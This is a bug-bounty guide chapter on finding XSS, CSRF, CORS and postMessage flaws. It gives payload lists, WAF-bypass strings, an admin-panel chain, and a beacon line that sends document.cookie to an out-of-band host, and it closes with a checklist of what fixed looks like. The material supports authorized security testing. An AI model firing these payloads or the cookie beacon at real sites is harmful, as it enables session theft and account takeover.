# 09 — XSS and client-side

XSS pays less than it used to, but it is still the most reliable way to get a
first accepted bug, and it becomes HIGH when it chains: stored XSS in an admin
panel, XSS that steals a session, XSS on an OAuth callback.

**Rule:** reflected XSS alone is Low in most programs. Stored XSS that fires for
other users is Medium. Stored XSS in a privileged context, or a chain to account
takeover, is High.

---

## The three types

| Type | Source | Fires for | Typical severity |
|---|---|---|---|
| Reflected | request param → response | the victim who clicks | Low–Medium |
| Stored | saved → rendered later | other users / admins | Medium–High |
| DOM | client JS writes to sink | whoever loads the page | Low–Medium |

---

## Where to test

- Search results page (`q` reflected in `<h1>`).
- Profile fields (name, bio, company) — stored, rendered on a public page.
- Comments, tickets, support messages — stored, rendered in the *agent's* panel.
  **This is the HIGH one:** an agent viewing your ticket executes your payload.
- Filenames on upload (rendered in a file list).
- Error messages that echo input.
- URL fragment consumed by JS (`location.hash` → `innerHTML`).
- `postMessage` handlers (`addEventListener("message")` → `innerHTML`).
- Markdown renderers (raw HTML allowed? `javascript:` links?).
- PDF/email generators that render HTML (often an internal admin opens it).
- CSV/HTML export viewed in a browser.

---

## Payloads that still work

Modern frameworks escape by default, so aim at sinks, not tags:

```html
<!-- basic reflection test -->
"><svg/onload=alert(1)>
'><img src=x onerror=alert(1)>
"><script>alert(1)</script>

<!-- attribute context -->
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="

<!-- javascript: URL in an href -->
javascript:alert(1)
jav&#x09;ascript:alert(1)

<!-- DOM sinks -->
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>

<!-- framework-specific -->
{{constructor.constructor('alert(1)')()}}     <!-- Angular sandbox escape era -->
```

**Use a unique marker** (`xssBBtest<random>`) so you can grep the response and count
occurrences. If the marker appears escaped (`&lt;`), the encoding is working.

---

## Encoding and context

The context decides the payload:

| Context | Break out with |
|---|---|
| HTML body | `<svg onload=…>` |
| Attribute value (double quote) | `" onmouseover=… x="` |
| Attribute value (single quote) | `' onmouseover=… x='` |
| Inside `<script>` string | `</script><svg onload=…>` or `'-alert(1)-'` |
| Inside `<style>` | `</style><svg onload=…>` |
| URL in `href` | `javascript:…` |
| JSON in `<script>` | `</script>` then payload |

If the app HTML-encodes `< > " '` in the body but not in an attribute, the
attribute is the way in. Look at the raw response, not the rendered page.

---

## WAF and filter bypass

- Case: `<ScRiPt>`, `<sVg OnLoAd=…>`.
- Alternate tags: `<svg>`, `<img>`, `<details>`, `<math>`, `<video>`.
- No parentheses: `<svg onload=alert\`1\`>`.
- No spaces: `<svg/onload=alert(1)>`.
- Encode: `%3Csvg%20onload%3Dalert(1)%3E`, double-encode, unicode.
- Split across params that are concatenated server-side.
- Mutation XSS (`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`)
  where a sanitizer re-parses and creates the tag.

A payload that is blocked by a WAF is not a finding. A payload that bypasses and
executes is.

---

## DOM XSS: read the JS

Search the bundle for these sinks and trace their sources:

```js
innerHTML, outerHTML, document.write, insertAdjacentHTML
eval, Function, setTimeout(string)
location, location.href, location.hash, location.search
element.setAttribute('href', userInput)
jQuery: .html(), $.parseHTML()
```

Sources: `location.*`, `document.referrer`, `window.name`, `postMessage`,
`localStorage`, `document.cookie`.

Test with the fragment: `https://target/page#<img src=x onerror=alert(1)>`.
Fragments never reach the server, so WAFs cannot see them — a DOM XSS via hash
is often the easiest bypass.

---

## Stored XSS in an admin panel — the HIGH path

1. Find a field a normal user controls that an admin views.
   - Support ticket subject/body.
   - "Company name" shown in the admin customer list.
   - File name in an admin upload review queue.
   - A profile field rendered in an internal tool.
2. Store a payload that beacons out (`new Image().src='http://<oast>/?c='+document.cookie`).
3. If the admin views it, you get their cookie/session or an internal page.
4. Chain: admin session → CSRF-less state change → privilege escalation.

This turns a "Medium stored XSS" into a High. Report the *chain*, not the tag.

---

## XSS → account takeover checklist

- [ ] Cookie lacks `HttpOnly`? Then `document.cookie` is enough.
- [ ] Cookie lacks `SameSite`? Then cross-site requests carry it.
- [ ] CSP absent or permissive (`unsafe-inline`, wildcard)? Payload runs.
- [ ] Session does not rotate? Stolen cookie survives.
- [ ] Can the payload call the "change email/password" API? Same-site fetch works.

If all five are bad, XSS = ATO = High. If `HttpOnly` + strict CSP + rotation, XSS
is Medium at best.

---

## Blind XSS

Payloads that fire in a panel you cannot see (admin, support, internal). Use
`interactsh` or a self-hosted XSS hunter:

```html
"><script src=https://<your-id>.oast.fun/x.js></script>
```

The callback tells you the URL, DOM, cookies, and origin. Blind XSS in an admin
panel is a common High.

---

## CSRF (client-side, adjacent)

- State-changing GET (`/delete?id=…`).
- No `SameSite` + no token + no `Origin` check.
- Token validated only on one method (`POST` checked, `PUT`/`DELETE` not).
- JSON endpoint that accepts `text/plain` (simple request, no preflight).

CSRF alone is Low–Medium now; a CSRF that changes email/password is High.

---

## CORS misconfiguration

```
Origin: https://evil.com
→ Access-Control-Allow-Origin: https://evil.com
→ Access-Control-Allow-Credentials: true
```

Reflects any origin + credentials = read any authenticated response = High. Test:

```bash
curl -s -D- "https://target/api/me" -H "Origin: https://evil.com" -H "Cookie: <session>"
```

Look for `ACAO: https://evil.com` and `ACAC: true`. Also test `Origin: null`,
subdomain reflection (`https://anything.target.com`), and prefix/suffix tricks
(`https://target.com.evil.com`).

---

## postMessage

```js
window.addEventListener("message", e => { document.body.innerHTML = e.data })
```

No origin check = DOM XSS from any opener. Test from a page you control that
frames or opens the target and posts a payload. Medium–High depending on
privilege.

---

## What closed looks like

- Output encoded in the exact context; marker appears as `&lt;` everywhere.
- CSP `script-src 'self'` with no `unsafe-inline`, no JSONP, no CDN allowlist.
- Cookies `HttpOnly` + `SameSite=Lax` + session rotated.
- `postMessage` checks `e.origin`.
- CORS allowlist exact-match, no `null`, no reflection.
- CSRF token required and validated on every mutating method.

Write "closed" and move on. Chasing encoded reflections burns hours.
